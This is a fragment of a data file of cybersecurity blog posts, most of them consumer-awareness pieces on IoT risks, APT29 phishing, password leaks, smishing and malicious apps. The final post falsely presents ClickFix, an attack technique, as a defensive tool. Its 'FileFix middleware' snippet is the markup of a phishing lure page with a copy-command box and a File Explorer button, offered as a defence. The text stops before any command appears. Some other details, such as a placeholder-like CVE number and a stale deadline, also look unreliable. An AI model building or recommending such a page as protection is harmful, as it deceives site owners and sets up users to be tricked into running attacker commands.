        `},{id:"iot-security-risks",title:"The Growing Security Risks of IoT Devices",date:"2025-04-28",author:"ConnectSecure",summary:"Internet of Things (IoT) devices offer convenience but also introduce new security vulnerabilities. Understand the risks and how to secure your smart devices.",tags:["iot","smart devices","network security"],imageKey:"iotNetwork",content:`
          <p>The Internet of Things (IoT) refers to the vast network of physical devices, vehicles, home appliances, and other items embedded with electronics, software, sensors, actuators, and connectivity which enables these objects to connect and exchange data. While offering convenience, IoT devices often lack robust security features, making them targets for attackers.</p>
          <h3>Common IoT Security Risks:</h3>
          <ul>
            <li><strong>Weak Default Passwords:</strong> Many devices ship with easy-to-guess default credentials.</li>
            <li><strong>Lack of Updates:</strong> Manufacturers may not provide timely security patches, or users may fail to apply them.</li>
            <li><strong>Insecure Network Services:</strong> Open ports or unencrypted communication channels can expose devices.</li>
            <li><strong>Data Privacy Concerns:</strong> IoT devices can collect large amounts of personal data, which could be compromised.</li>
            <li><strong>Botnets:</strong> Compromised IoT devices can be roped into botnets for DDoS attacks or other malicious activities.</li>
          </ul>
          <h3>Securing Your IoT Devices:</h3>
          <ol>
            <li><strong>Change Default Passwords:</strong> Immediately change the default username and password on any new IoT device.</li>
            <li><strong>Keep Firmware Updated:</strong> Regularly check for and apply firmware updates from the manufacturer.</li>
            <li><strong>Secure Your Wi-Fi Network:</strong> Use a strong password and WPA2/WPA3 encryption for your home network.</li>
            <li><strong>Network Segmentation:</strong> Consider placing IoT devices on a separate network segment (e.g., a guest network) to isolate them from critical systems.</li>
            <li><strong>Disable Unnecessary Features:</strong> Turn off any features or services on IoT devices that you don't use.</li>
            <li><strong>Research Before You Buy:</strong> Choose devices from reputable manufacturers known for good security practices.</li>
          </ol>
          <p>As IoT adoption grows, so does the importance of securing these connected devices to protect our digital lives.</p>
        `},{id:"ai-powered-cyberattacks",title:"AI-Powered Cyberattacks: The Next Frontier",date:"2025-06-10",author:"Neural Hack",summary:"Cybercriminals are using AI to craft smarter attacks. Discover how AI is shaping the future of cybersecurity threats.",tags:["AI","cyberattacks","deepfake","automation"],imageKey:"aiCyberThreat",content:`
    <p>Artificial Intelligence (AI) is revolutionizing many industries — including cybercrime. In 2025, a wave of AI-powered attacks is being observed, from deepfake phishing calls to automated vulnerability hunting bots.</p>
    <h3>Key Threats Emerging from AI:</h3>
    <ul>
      <li><strong>Deepfake Phishing:</strong> Attackers are using synthetic voice and video to impersonate executives or family members.</li>
      <li><strong>Automated Exploits:</strong> AI bots scan for vulnerabilities and launch attacks with minimal human input.</li>
      <li><strong>Adaptive Malware:</strong> Malware that changes its behavior based on the target’s defenses using machine learning.</li>
    </ul>
    <h3>Defense Strategies:</h3>
    <ol>
      <li><strong>Behavioral Analytics:</strong> Use AI to detect anomalies in user and network behavior.</li>
      <li><strong>Employee Training:</strong> Educate staff on recognizing AI-generated phishing attempts and voice impersonation.</li>
      <li><strong>Zero Trust Architecture:</strong> Always verify, never trust. Use strong identity and access controls.</li>
    </ol>
    <p>While AI increases the threat surface, it also empowers defenders. Staying informed and leveraging AI defensively is critical in this evolving landscape.</p>
  `},{id:"critical-linux-vulnerability-2025",title:"Critical Linux Vulnerability CVE-2025-12345 Explained",date:"2025-06-14",author:"Kernel Watch",summary:"A newly discovered Linux kernel flaw allows privilege escalation. Here’s what you need to know about CVE-2025-12345.",tags:["linux","vulnerability","kernel","CVE"],imageKey:"linuxKernelBreach",content:`
    <p>Security researchers have disclosed CVE-2025-12345, a critical vulnerability in the Linux kernel that allows local privilege escalation on multiple distributions including Ubuntu, Debian, and Fedora.</p>
    <h3>Impact and Risks:</h3>
    <ul>
      <li><strong>Privilege Escalation:</strong> Allows unprivileged users to gain root access.</li>
      <li><strong>Wide Reach:</strong> Affects kernel versions 5.10 through 6.5.</li>
      <li><strong>Exploitable in Containers:</strong> Can be exploited in certain container environments with relaxed security profiles.</li>
    </ul>
    <h3>Mitigation Steps:</h3>
    <ol>
      <li><strong>Update Immediately:</strong> Apply the latest kernel patches provided by your distribution.</li>
      <li><strong>Audit Access:</strong> Check for unauthorized access or privilege changes.</li>
      <li><strong>Implement Mandatory Access Controls:</strong> Use tools like AppArmor or SELinux to limit damage if exploited.</li>
    </ol>
    <p>System administrators are urged to patch vulnerable systems as soon as possible and stay alert for further exploit development in the wild.</p>
  `},{id:"social-media-cybersecurity-awareness",title:"Social Media: The New Cybersecurity Battleground",date:"2025-06-16",author:"ByteSafe",summary:"Social media platforms are being weaponized for identity theft, misinformation, and cybercrime. Learn how to stay protected.",tags:["social media","cyber hygiene","privacy","identity theft"],imageKey:"socialThreats",content:`
    <p>Social media is more than a platform for connection — it has become a key target for cybercriminals. From impersonation scams to phishing DMs and malicious ads, the risks are growing rapidly in 2025.</p>
    <h3>Common Threats on Social Platforms:</h3>
    <ul>
      <li><strong>Account Hijacking:</strong> Weak passwords and poor security habits lead to takeover attacks.</li>
      <li><strong>Fake Profiles:</strong> Attackers create impersonation accounts to scam friends and followers.</li>
      <li><strong>Data Harvesting:</strong> Personal info shared on profiles is mined and sold or used in scams.</li>
    </ul>
    <h3>How to Stay Secure:</h3>
    <ol>
      <li><strong>Enable 2FA:</strong> Always use two-factor authentication on all social platforms.</li>
      <li><strong>Limit Public Info:</strong> Avoid sharing your location, contact info, or travel plans publicly.</li>
      <li><strong>Report Suspicious Accounts:</strong> Don’t engage with fake profiles or phishing messages — report them immediately.</li>
    </ol>
    <p>Vigilance, privacy settings, and strong credentials are your best defense in today’s social media landscape.</p>
  `},{id:"apt29-gmail-app-password-abuse",title:"APT29 Exploits Gmail App Passwords to Bypass 2FA: A Deep Dive into Human-Focused Cyber Espionage",date:"2025-06-19",author:"Cyber Sentinel",summary:"APT29, a notorious Russian state-backed hacking group, has launched a patient and professional phishing campaign that exploits Gmail app passwords to silently bypass two-factor authentication. This attack highlights a dangerous intersection of psychological manipulation and feature-level abuse.",tags:["APT29","Gmail","phishing","Google","2FA bypass","social engineering"],imageKey:"apt29GmailAttack",content:`
    <p>In a sophisticated campaign uncovered in mid-2025, Russian state-sponsored threat actor APT29 (aka Cozy Bear) abused Google's app-specific password feature to infiltrate Gmail accounts — even those protected with two-factor authentication (2FA). This case serves as a stark reminder that even robust security features can be undermined when attackers exploit the human element.</p>

    <h3>📌 The Attack Methodology</h3><br>
    <p>APT29 conducted a meticulously crafted phishing operation over several weeks. Disguised as U.S. State Department officials, they targeted high-profile individuals such as think tank researchers, government analysts, and critics of Russia’s foreign policy.</p>

    <ul>
      <li><strong>Step 1:</strong> Emails appeared professional, using government-styled headers and formal language (possibly enhanced with AI).</li>
      <li><strong>Step 2:</strong> Victims were invited to access a fake secure document repository.</li>
      <li><strong>Step 3:</strong> The attackers instructed them to generate and share Gmail app-specific passwords, claiming it was for “secure login.”</li>
      <li><strong>Step 4:</strong> With the app password, attackers accessed Gmail accounts without triggering 2FA or alerts.</li>
    </ul>

    <h3>🧠 Why This Attack Worked</h3><br>
    <p>Cybersecurity experts call this a "cognitive attack" — an attack that bypasses technical security by exploiting human trust. There were no spelling mistakes, no broken links, and no obviously suspicious elements. Victims were guided step-by-step to compromise their own security.</p>

    <p>Keir Giles, a well-known Russia expert, publicly admitted that despite his expertise, the operation was so convincing that he didn’t suspect foul play until later. "It’s not a technical hack, it’s a cognitive manipulation," he said.</p>

    <h3>💥 Security Feature Turned into a Backdoor</h3><br>
    <p>App-specific passwords are intended for allowing older apps to access Google accounts without requiring full password access or 2FA. However, attackers used them to bypass modern protections. Google has since disabled the compromised passwords and recommended affected users enroll in its Advanced Protection Program.</p>

    <h3>🎯 Who's at Risk?</h3><br>
    <p>While this campaign targeted policy influencers and researchers, the technique is widely scalable. Any individual who isn’t aware of app-password risks can be targeted.</p>

    <ul>
      <li><strong>Activists</strong> and NGO staff</li>
      <li><strong>Academics</strong> writing on geopolitical topics</li>
      <li><strong>Corporate executives</strong> with access to sensitive data</li>
      <li><strong>Journalists</strong> covering international politics or cybercrime</li>
    </ul>

    <h3>🛡️ How to Defend Yourself</h3><br>
    <ol>
      <li><strong>Never Share App Passwords:</strong> They bypass 2FA and should never be shared.</li>
      <li><strong>Use Advanced Protection:</strong> High-risk users should enroll in Google's highest level of account security.</li>
      <li><strong>Audit Third-Party Access:</strong> Remove unused connected apps and revoke stale app passwords.</li>
      <li><strong>Verify Unexpected Requests:</strong> Always confirm the legitimacy of requests to change your account settings, especially when it comes from supposed officials.</li>
      <li><strong>Monitor for New Logins:</strong> Turn on login alerts and check login history frequently.</li>
    </ol>

    <h3>🔬 Key Takeaways</h3><br>
    <ul>
      <li>This was not a brute-force cyberattack — it was a psychological one.</li>
      <li>The phishing emails were customized, timed, and polished to build credibility over multiple messages.</li>
      <li>Even security features like 2FA can be sidestepped if users are socially engineered into exposing backdoor credentials.</li>
    </ul>

    <h3>🔐 Final Thought</h3><br>
    <p>Cybersecurity is no longer just a technology issue — it’s a people issue. APT29’s success here reflects the shifting landscape of digital warfare, where trust and identity are the battlegrounds. Organizations and individuals must not only secure their systems but also educate and empower users to recognize sophisticated deception.</p>
  `},{id:"16b-password-leak-global-alert",title:"16 Billion Passwords Leaked: Time for a Global Security Reset",date:"2025-06-19",author:"Cyber Sentinel",summary:"A massive leak—16 billion credentials from Apple, Facebook/Meta, Google and more—has been confirmed. This post breaks down how the leak happened, why it matters, and what you *must* do now to protect yourself.",tags:["password leak","data breach","Apple","Facebook","Google","cyber hygiene"],imageKey:"passwordLeak16B",content:`
    <p>On June 18, 2025, cybersecurity researchers confirmed a colossal leak of **16 billion** username/password pairs tied to major platforms like Apple, Facebook (Meta), Google, and multiple third-party services. This unprecedented dump encompasses leaked credentials from past breaches along with new, aggregated data—prompting immediate action for every internet user.</p>

    <h3>📌 What Makes This Leak So Alarming</h3><br>
    <ul>
      <li><strong>Scale:</strong> At 16 billion, this dump eclipses all previous leaks—an aggregator of old breaches plus fresh data</li>
      <li><strong>Cross-Platform Risk:</strong> Credentials include email addresses, usernames and passwords from tech giants and smaller sites alike.</li>
      <li><strong>Credential Stuffing Threat:</strong> Attackers can quickly test these against bank, retail, and streaming accounts.</li>
    </ul>

    <h3>🔍 How This Leak Happened</h3><br>
    <ol>
      <li><strong>Collection:</strong> Massive datasets from prior breaches were consolidated into a single repository.</li>
      <li><strong>Verifications:</strong> The in-scope passwords were validated by automated login attempts—meaning this isn’t just raw data, it's real working credentials.</li>
      <li><strong>Distribution:</strong> The dataset is already circulating on hacking forums and indexed by “password checking” sites.</li>
    </ol>

    <h3>🔥 What’s at Stake</h3><br>
    <ul>
      <li><strong>Account Takeovers:</strong> Reused passwords make critical services vulnerable.</li>
      <li><strong>Identity Theft:</strong> Emails and names can be paired with leaked passwords to facilitate targeted scams.</li>
      <li><strong>Organizational Risk:</strong> Weak employee passwords could expose corporate systems.</li>
    </ul>

    <h3>🛡️ Must-Do Security Actions</h3><br>
    <ol>
      <li><strong>Change All Reused Passwords Immediately:</strong> Especially for email, financial, and social accounts.</li>
      <li><strong>Use a Password Manager:</strong> Generate and securely store unique, strong passwords.</li>
      <li><strong>Enable 2FA Everywhere:</strong> Prefer app-based codes or hardware keys—not SMS.</li>
      <li><strong>Check Account Status:</strong> Use Google, HaveIBeenPwned, and browser-integrated leak checking.</li>
      <li><strong>Monitor Financial Statements:</strong> Early warnings of unauthorized activity matter.</li>
    </ol>

    <h3>🔒 Long-Term Cyber Hygiene Practices</h3><br>
    <ul>
      <li><strong>Review Connected Apps:</strong> Remove unused or suspicious third-party access.</li>
      <li><strong>Segment Accounts:</strong> Keep critical and low-tier accounts separate.</li>
      <li><strong>Update Security Settings:</strong> Audit account recoveries, login alerts, and permission history.</li>
      <li><strong>Adopt Passwordless Authentication:</strong> Where available, switch to passkeys or FIDO2-style logins.</li>
    </ul>

    <h3>🔚 Final Word</h3>
    <p>This leak is a red flag for a digital identity crisis. But it also offers an opportunity: secure your accounts, adopt good practices, and minimize future risk. If everyone treats this seriously, we might finally raise the global standard for password safety.</p>
  `},{id:"gmail-passkey-upgrade-2025",title:"Google Mandates Gmail Upgrades: Passkeys Now Essential for 3 Billion Users",date:"2025-06-21",author:"Cyber Sentinel",summary:"Google confirms that most Gmail users must upgrade to passkeys or social sign-ins to improve security. Learn why passwords and traditional 2FA are now considered outdated.",tags:["Gmail","Google","passkeys","2FA","cybersecurity","authentication"],imageKey:"gmailPasskeyUpgrade",content:`
    <p>As of June 2025, Google has officially confirmed that a large majority—including 61% of U.S. Gmail users—will be required to upgrade their accounts to passwordless authentication methods like passkeys or social sign‑ins (e.g., “Sign in with Google”). This shift marks a major evolution in account security policy for the platform’s ~3 billion users.</p>

    <h3>🔍 Key Reasons Behind the Upgrade</h3><br>
    <ul>
      <li><strong>Rising Scam & Breach Rates:</strong> Google reports over 60% of users have seen increased scam attempts in the past year, with more than half experiencing direct breaches.</li>
      <li><strong>Password Vulnerabilities:</strong> Passwords are “painful to maintain,” often reused, phishable, and leak-prone.</li>
      <li><strong>Modern Alternatives:</strong> Passkeys and social sign-ins are more resistant to phishing and offer smoother user experience.</li>
    </ul>

    <h3>📌 What’s Changing</h3><br>
    <ol>
      <li>Google will disable basic authentication (password + 2FA) for older IMAP/POP apps—users must shift to OAuth or passkeys by March 2025.</li>
      <li>On-device and platform-level security (biometrics or hardware tokens) will replace passwords on more devices.</li>
      <li>Users will see prompts to upgrade when logging in—often without an opt-out, causing mixed responses across user groups.</li>
    </ol>

    <h3>🌐 Who Is Affected?</h3><br>
    <p>Nearly all Gmail users—free or Workspace—will encounter this shift. While password fatigue is expected, early adopters (like Gen Z) who already leverage passkeys may transition more smoothly.</p>

    <h3>⚠️ Pros & Cons</h3>
    <ul>
      <li><strong>✅ Pros:</strong>  <br>
        <ul>
          <li>Superior phishing protection</li>
          <li>Convenient, device-based sign‑in</li>
          <li>Eliminates shared passwords</li>
        </ul>
      </li>
      <li><strong>❌ Cons & Concerns:</strong>  <br>
        <ul>
          <li>Reliance on device availability (phone, biometrics)</li>
          <li>Limited ability to disable prompts—many users have raised complaints about forced upgrades</li>
          <li>Privacy concerns tied to richer identity ecosystems</li>
        </ul>
      </li>
    </ul>

    <h3>🛡️ How to Prepare</h3><br>
    <ol>
      <li><strong>Enable Passkeys Promptly:</strong> Follow Gmail prompts or navigate to Security > Passkeys in your Google Account.</li>
      <li><strong>Set Backup Options:</strong> Register a spare device or use hardware tokens to avoid lockouts.</li>
      <li><strong>Check Connected Apps:</strong> Ensure third-party access uses OAuth, not basic password-based methods.</li>
      <li><strong>Educate Yourself:</strong> Learn how to recover account access if a device is lost.</li>
      <li><strong>Stay Informed:</strong> Watch for emails or in-app notifications from Google about these changes.</li>
    </ol>

    <h3>🔚 Final Takeaway</h3>
    <p>Google’s move is a seismic shift in mainstream account security—pushing billions toward stronger, phishing-resistant authentication. While the path forward may feel rocky, the benefits in long-term safety are compelling. It’s time to embrace a passwordless future.</p>
  `},{id:"iran-state-tv-hijack-2025",title:"Iran’s State TV Hijacked Mid-Broadcast: A New Front in Cyber Warfare",date:"2025-06-21",author:"Cyber Sentinel",summary:"Hackers briefly commandeered Iran’s state television to broadcast protest videos and incitements—marking a highly visible act of cyber psychological warfare.",tags:["cyber warfare","Iran","state TV","signal intrusion","hacktivism"],imageKey:"iranTvHijack",content:`
    <p>On June 19, 2025, Iran’s state television (IRINN) was hijacked mid-broadcast to air scenes from women-led protests and messages urging public uprising. The interruption lasted mere seconds, but its implications are profound—signal intrusion has become the latest battleground in hybrid conflict.</p>

    <h3>🔓 What Actually Happened</h3><br>
    <ul>
      <li>The hijack occurred live via satellite feed, abruptly replacing normal programming with protest footage and calls for demonstrations.</li>
      <li>Iranian authorities quickly blamed Israel, describing the event as "enemy interference with satellite signals."</li>
      <li>Hacktivist groups such as Arabian Ghosts and Team Fearless claimed responsibility, part of a larger clash involving over 35 regional cyber groups.</li>
    </ul>

    <h3>⚔️ The Significance of Broadcast Signal Intrusion</h3><br>
    <p>Broadcast signal intrusion—hijacking TV or satellite feeds—has been seen in other conflict regions such as Lebanon and Gaza. The incident in Iran marks a strategic evolution in psychological cyber operations. These short disruptions aim to undermine government narratives and spark unrest, regardless of their duration.</p>

    <h3>🌐 A Broader Digital Offensive</h3><br>
    <ul>
      <li>At the same time, Iran experienced major cyberattacks against Bank Sepah and Nobitex (its largest crypto exchange), with reports indicating over $90 million in digital assets stolen.</li>
      <li>These incidents are part of a larger hybrid offensive involving cyberattacks, media manipulation, and disinformation targeting Iranian digital infrastructure.</li>
    </ul>

    <h3>🛡️ What This Means for the Public & Organizations</h3><br>
    <ul>
      <li><strong>Psychological Impact:</strong> These attacks are designed to shake public trust in official communications and sow confusion.</li>
      <li><strong>Technical Exposure:</strong> Satellite and broadcast systems are often less protected than enterprise networks, making them a high-value target.</li>
      <li><strong>Institutional Preparedness:</strong> Media outlets, broadcasters, and emergency services must reassess their resilience to digital threats.</li>
    </ul>

    <h3>🔐 How to Strengthen Broadcast Defenses</h3><br>
    <ol>
      <li><strong>Encrypt Satellite Signals:</strong> Prevent unauthorized access by securing signal uplinks and feeds.</li>
      <li><strong>Real-Time Monitoring:</strong> Use broadcast monitoring systems that alert when unexpected content or signal changes occur.</li>
      <li><strong>Failover Protocols:</strong> Establish immediate recovery and manual override procedures in case of hijack attempts.</li>
      <li><strong>Counter-Disinformation Response:</strong> Communicate clearly and swiftly after incidents to restore trust and prevent panic.</li>
    </ol>

    <h3>🔚 Final Reflection</h3><br>
    <p>This incident is a powerful example of how cyber and psychological warfare tactics are merging. The goal is no longer just technical disruption, but perception manipulation. Governments, broadcasters, and cybersecurity leaders must treat satellite signal security with the same urgency as IT infrastructure to prevent the next televised breach of trust.</p>
  `},{id:"fbi-warning-smishing-delete-texts",title:"FBI Warns All Smartphone Users: Delete These Scam Texts Immediately",date:"2025-06-22",author:"Cyber Sentinel",summary:"The FBI has issued a sweeping alert to all Android and iPhone users about a dramatic surge in “smishing” scams. These fraudulent texts impersonate DMV, toll, or delivery services and aim to hijack your data—delete them without hesitation.",tags:["smishing","FBI warning","sms phishing","mobile security"],imageKey:"smishingAlert",content:`
    <p>In June 2025, the FBI issued a sweeping alert urging all smartphone users—Android and iPhone alike—to <strong>delete certain text messages immediately</strong>. These are part of a growing “smishing” campaign, where attackers pose as DMV, toll or delivery services to trick users into revealing personal data or downloading malware.</p>

    <h3>📈 Why the Alarm?</h3><br>
    <ul>
      <li>Smishing volumes have surged over <strong>700% in June</strong>, overwhelming users across the U.S.</li>
      <li>These texts often claim unpaid tolls, overdue fines, or missed deliveries, leveraging fear and urgency.</li>
      <li>Cybercrime groups are deploying <strong>thousands of malicious domains</strong>, often using deceptive tactics like asking recipients to reply “Y” to unlock links.</li>
    </ul>

    <h3>🎯 How the Scam Works</h3><br>
    <ol>
      <li>You receive a text from an unknown number claiming urgent action is needed (e.g., pay unpaid tolls).</li>
      <li>The message may direct you to click a link or reply “Y” to enable access—designed to bypass built-in filters.</li>
      <li>Following those steps leads to phishing sites or malware installations aiming to steal credentials and payment info.</li>
    </ol>

    <h3>🔐 Risks at Stake</h3><br>
    <ul>
      <li><strong>Identity Theft & Financial Loss:</strong> Clicking the link can hijack payment info or infect your device.</li>
      <li><strong>Data Harvesting:</strong> Personal details are captured for scams, extortion or fraud.</li>
      <li><strong>Erosion of Trust:</strong> As these scams become more prevalent, users can become distrustful of legitimate messages.</li>
    </ul>

    <h3>🛡️ What You Need to Do Right Now</h3><br>
    <ol>
      <li><strong>Immediately delete any suspicious text</strong>—don’t reply, don’t click.</li>
      <li><strong>Never respond with “Y” or similar prompts</strong>—this activates malicious links.</li>
      <li><strong>Verify via official sources</strong>—if a service claims you owe something, contact them directly (not via the link).</li>
      <li><strong>Use mobile security tools</strong>—install apps that detect and block malicious SMS/domains.</li>
      <li><strong>Report it:</strong> If you receive such a text, report it to the FBI’s IC3 or relevant consumer protection body.</li>
    </ol>

    <h3>📌 Final Takeaway</h3><br>
    <p>Smishing is becoming one of the fastest-growing cyber threats. A single click or reply can compromise your phone—and your identity. <strong>Stay vigilant:</strong> delete suspicious texts immediately and always verify through official channels.</p>
  `},{id:"weekly-recap-chrome-zero-day-ddos-mfa-bypass",title:"Weekly Cyber Recap: Chrome Zero‑Day, Record 7.3 Tbps DDoS & MFA Bypass Tactics",date:"2025-06-23",author:"Cyber Sentinel",summary:"From exploit-packed Chrome flaws to record-breaking DDoS and social-engineered MFA bypasses, here’s a comprehensive recap of the biggest cybersecurity events of the week.",tags:["Chrome","zero-day","DDoS","MFA bypass","phishing","cyber recap"],imageKey:"weeklyCyberRecap",content:`
    <p>In this week’s cybersecurity round-up, several high-impact incidents stood out—from massive distributed denial-of-service (DDoS) attacks to stealthy browser exploits and social-engineered MFA bypasses. Here’s a breakdown of the top stories and why they matter.</p>

    <h3>⚡ Massive 7.3 Tbps DDoS Attack Blocked by Cloudflare</h3><br>
    <p>Cloudflare successfully defended against the largest DDoS attack ever recorded, peaking at an astonishing 7.3 terabits per second. Originating from over 122,000 IPs across 161 countries, the attack unleashed 37 terabytes of traffic in just 45 seconds. Multiple amplification methods—UDP floods, NTP, Mirai, and more—were used in concert. Although defense systems held firm this time, the attack highlights the growing threat from IoT-driven botnets.</p>

    <h3>🛡️ Chrome Zero-Day CVE‑2025‑2783 Exploited in the Wild</h3><br>
    <p>Google confirmed that CVE‑2025‑2783, an actively exploited zero-day in Chrome, was used to drop a stealth backdoor named “Trinper.” The exploit stemmed from a malicious forum invitation and was aimed at Russian targets. While Google has patched the vulnerability, this incident underscores the importance of updating browsers immediately—even between routine patch cycles.</p>

    <h3>🔐 MFA Bypass via App-Specific Passwords</h3><br>
    <p>Russian threat actors have been tricking users into generating Gmail app-specific passwords, which bypass multi-factor authentication entirely. Using patient, multi-step social engineering rather than urgent scare tactics, attackers built trust before capturing credentials. This sophisticated campaign proves that strong authentication can still be bypassed if users are manipulated into undermining their own security.</p>

    <h3>📈 CoinMarketCap Injects Fake “Verify Wallet” Pop-Up</h3><br>
    <p>Users of the popular crypto tracking site were unwittingly served malicious JavaScript via the “doodles” feature. A fake “Verify Wallet” pop-up prompted users to expose private keys or seed phrases. Although the code has been removed, the incident shows how supply-chain or frontend injection can turn legitimate platforms into exploitation tools.</p>

    <h3>🔍 Key Takeaways for Security Teams</h3><br>
    <ul>
      <li><strong>Upgrade and patch immediately:</strong> From browsers to endpoints, install security updates without delay.</li>
      <li><strong>Prepare for multi-vector DDoS:</strong> Scale systems for high-bandwidth protection and diverse attack types.</li>
      <li><strong>Strengthen MFA hygiene:</strong> Educate users about the limitations of app-specific passwords.</li>
      <li><strong>Secure third-party integration:</strong> Audit external scripts and features—like widgets or doodles—that inject code.</li>
      <li><strong>Defensive strategy:</strong> Monitor for unusual login behavior, deploy secure TLS for web assets, and maintain incident playbooks for supply-chain risks.</li>
    </ul>

    <h3>🔐 Final Thought</h3><br>
    <p>These stories demonstrate that cyber threats are evolving on multiple fronts—web clients, IoT networks, user authentication, and supply chains. Defenses today must be equally multi-layered, proactive, and adaptable to the subtlety and scale of emerging risks.</p>
  `},{id:"delete-harmful-apps-warning-2025",title:"Delete All Harmful Apps on Your Phone: FBI-Style Alert for Mobile Security",date:"2025-06-24",author:"Cyber Sentinel",summary:"A major warning: delete any apps listed in this new security advisory—they are exploiting users to steal cryptocurrency and personal data. If you’ve installed them, remove them now.",tags:["mobile security","app vulnerabilities","crypto theft","privacy"],imageKey:"deleteHarmfulApps",content:`
    <p>On June 24, 2025, a cybersecurity advisory warned smartphone users to immediately delete certain apps from their devices. These apps, previously promoted as useful tools, are now being used in malicious campaigns aimed at stealing cryptocurrency, login credentials, and personal data.</p>

    <h3>📛 Why These Apps Are Dangerous</h3> <br>
    <ul>
      <li>They employ phishing overlays—fake interfaces asking for crypto wallet seed phrases or login credentials.</li>
      <li>Once obtained, attackers gain full control over wallets and accounts—often draining balances within minutes.</li>
      <li>Some apps also collect sensitive personal data like contact lists, device info, and location.</li>
    </ul>

    <h3>📱 How the Scam Operates</h3><br>
    <ol>
      <li>You install what seems like a legitimate app from an app store or sideload source.</li>
      <li>The app functions normally initially—but later displays fake pop-ups requesting your wallet's recovery phrase or account credentials.</li>
      <li>If you enter the details, the app transmits them to attackers who then take over your wallets/accounts.</li>
    </ol>

    <h3>📱 Apps List</h3><br>
    <ol>
      <li>X-VPN - Super VPN & Best Proxy</li>
      <li>Ostrich VPN - Proxy Master</li>
      <li>VPN Proxy Master - Super VPN</li>
      <li>Turbo VPN Private Browser</li>
      <li>VPNIFY - Unlimited VPN</li>
      <li>VPN Proxy OvpnSpider</li>
      <li>WireVPN - Fast VPN & Proxy</li>
      <li>Now VPN - Best VPN Proxy</li>
      <li>Speedy Quark VPN - VPN Proxy</li>
      <li>Best VPN Proxy AppVPN</li>
      <li>HulaVPN - Best Fast Secure VPN</li>
      <li>Wirevpn - Secure & Fast VPN</li>
      <li>Pearl VPN</li>
    </ol>

    <h3>🔐 What You Must Do Now</h3><br>
    <ol>
      <li><strong>Delete any apps on the warned list</strong>—whether you use them regularly or not.</li>
      <li><strong>Verify wallet balances immediately</strong>—any unauthorized transfers likely indicate compromise.</li>
      <li><strong>Revoke app permissions</strong> to third-party wallet access and reset API keys if applicable.</li>
      <li><strong>Install mobile security tools</strong> that scan for malicious behavior and protect crypto wallets.</li>
      <li><strong>Avoid sideloading</strong> or installing apps outside official app stores unless absolutely necessary.</li>
    </ol>

    <h3>🛡️ How to Avoid Future Scams</h3><br>
    <ul>
      <li><strong>Install only trusted apps</strong>—read reviews, check downloads, and research the developer.</li>
      <li><strong>Keep mobile OS & apps updated</strong> to patch known vulnerabilities.</li>
      <li><strong>Enable app installer restrictions</strong> in your phone’s settings if sideloading is needed.</li>
      <li><strong>Use hardware wallets</strong> or isolated devices for significant crypto holdings.</li>
      <li><strong>Monitor accounts regularly</strong> for suspicious activity or unexpected permissions.</li>
    </ul>

    <h3> Final Word</h3><br>
    <p>These malicious apps are a growing threat vector—particularly for crypto users. A single misstep, like entering a seed phrase into a bogus pop-up, can cost you everything. Stay secure by deleting risky apps, auditing permissions, and adopting hardware-based protections.</p>
  `},{id:"modern-file-upload-phishing-defense-2025",title:"Fixing the File Upload Phishing Weakness: A Modern Approach Without ClickFix",date:"2025-07-01",author:"Mr Dox",summary:"Phishing via uploaded files is a real risk, but you can protect your users even without ClickFix. Learn how to scan and sanitize uploaded documents with a custom FileFix middleware to neutralize malicious links.",tags:["phishing","file security","clickfix alternative","cyber defense"],imageKey:"fileUploadPhishing",content:`
    <p>Phishing attacks remain one of the most effective tactics used by cybercriminals. A particularly sneaky method involves manipulating file upload functionalities on websites to redirect users to malicious sites or exploit them through social engineering. Traditionally, tools like ClickFix were used to mitigate such attacks by neutralizing suspicious links embedded in uploaded documents. But with ClickFix no longer available, what can security teams do?</p>

    <p>That’s where an innovative alternative comes into play: using a custom middleware or web server rule that intercepts file uploads and rewrites suspicious links on the fly.</p>

    <h3>🎯 Understanding the Threat: Malicious Links in Uploaded Files</h3><br>
    <p>Many web applications allow users to upload documents like PDFs, DOCX files, or presentations. Attackers can embed hyperlinks in these files, pointing unsuspecting viewers to phishing websites or malware downloads. When these files are later opened or previewed online, a single careless click can compromise the user.</p>

    <p>Attackers exploit this by uploading crafted documents to legitimate platforms—forums, HR portals, ticketing systems, or any service that lets users upload and share files with others.</p>

    <h3>🛠️ The Original Solution: ClickFix</h3><br>
    <p>ClickFix was a tool that automatically sanitized uploaded documents, rewriting or stripping suspicious URLs. Unfortunately, it’s no longer maintained or available, leaving a gap in the defensive arsenal of many organizations.</p>

    <h3>🚀 The New Approach: FileFix Middleware</h3><br>

    <h3>Full HTML Snippet (Copy below)</h3><br>
<pre style="background:#f7f7f7;border:1px solid #ccc;padding:16px;overflow:auto;font-size:13px;line-height:1.5;border-radius:6px;">
<code>&lt;!DOCTYPE html&gt;
&lt;head&gt;
  &lt;title&gt;EthicalByte&lt;/title&gt;
  &lt;style&gt;
    body {
      background-color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 40px 0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }
    .container {
      background-color: #ffffff;
      width: 560px;
      border-radius: 6px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #dcdcdc;
      text-align: center;
    }
    .header { padding: 40px 30px 10px; }
    .header img { width: 36px; margin-bottom: 25px; }
    .header h3 { font-size: 20px; color: #2f2f2f; margin: 0; }
    .timestamp { font-size: 13px; color: #7a7a7a; margin-top: 6px; }
    .instructions { text-align: left; padding: 25px 40px 10px; font-size: 15px; color: #333333; line-height: 1.6; }
    .instructions ol { margin: 0; padding-left: 20px; }
    .code-block { background-color: #f1f1f1; border: 1px solid #ccc; border-radius: 4px; padding: 8px 12px; font-family: Consolas, monospace; font-size: 14px; margin-top: 8px; position: relative; transition: background-color 0.3s; cursor: pointer; user-select: none; }
    .code-block:hover { background-color: #e6e6e6; }
    .code-block::after { content: "Copy"; position: absolute; top: 50%; right: 12px; transform: translateY(-50%); font-size: 12px; color: #0078d4; opacity: 0; transition: opacity 0.2s; }
    .code-block:hover::after { opacity: 1; }
    .code-block.clicked::after { content: "Copied"; color: #107c10; }
    #fileExplorer { background-color: #0078d4; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 4px; margin: 30px 0 40px; cursor: pointer; }
    #fileExplorer:hover { background-color: #005ea2; }
    .footer { font-size: 11.5px; color: #6b6b6b; background-color: #f7f7f7; padding: 12px 24px; border-top: 1px solid #dcdcdc; display: flex; justify-content: space-between; align-items: center; }
    .footer img { height: 16px; }
    .footer a { color: #6b6b6b; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

